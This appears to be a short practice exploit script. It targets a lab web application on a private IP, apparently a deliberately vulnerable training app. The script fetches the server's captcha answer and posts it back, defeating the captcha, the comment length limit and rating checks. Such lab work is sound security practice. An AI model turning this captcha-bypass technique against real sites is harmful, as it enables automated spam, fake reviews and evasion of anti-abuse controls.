#A super barebones script to programatically add Customer Feedback via API
#and takes away the 160 word limit and able to give any user name.(or rating)

#How to use: Change the webserver IP address accordingly
#            Give comment and rating accordingly
#            run python3 feedbackVuln.py

#author: Fadleen Sidek
#date: 06 Feb 21
#ver: 0.1

import requests
import json

CAPTCHA_GEN_URL = "http://192.168.56.246/rest/captcha"
FEEDBACK_URL = "http://192.168.56.246/api/Feedbacks"

#Get the captcha ID and its details
resp = requests.get(url = CAPTCHA_GEN_URL)
data = resp.json()
print(data['captchaId'], data['answer'])

#data to send to API
data = {'captchaId':data['captchaId'],
        'captcha':data['answer'],
         'comment':'Sunyinya malam ini tiada bulan tiada bintang (Gersang)',
         'rating':5
        }

#send the feedback
resp = requests.post(url = FEEDBACK_URL, data = data)
#should return <Response [201]> to indicate resource created and successful
print(resp)
